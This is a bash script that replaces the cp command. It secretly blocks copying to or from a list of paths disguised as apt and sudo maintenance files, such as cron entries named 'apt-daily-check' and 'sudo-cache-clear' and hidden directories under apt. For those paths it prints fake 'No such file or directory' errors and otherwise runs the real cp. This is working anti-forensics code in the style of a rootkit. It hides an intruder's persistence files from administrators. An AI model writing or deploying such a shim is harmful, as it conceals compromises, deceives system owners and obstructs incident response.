#!/bin/bash
REAL_CP="/bin/cp"

PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

PATH_ARGS=()
for arg in "$@"; do
    case "$arg" in
        -*) ;;
        *) PATH_ARGS+=("$arg") ;;
    esac
done

if [ ${#PATH_ARGS[@]} -ge 2 ]; then
    DEST="${PATH_ARGS[-1]}"

    if _is_protected "$DEST"; then
        echo "cp: cannot create regular file '${DEST}': No such file or directory" >&2
        exit 1
    fi

    for (( i=0; i<${#PATH_ARGS[@]}-1; i++ )); do
        SRC="${PATH_ARGS[$i]}"
        if _is_protected "$SRC"; then
            echo "cp: cannot stat '${SRC}': No such file or directory" >&2
            exit 1
        fi
    done
fi

exec $REAL_CP "$@"
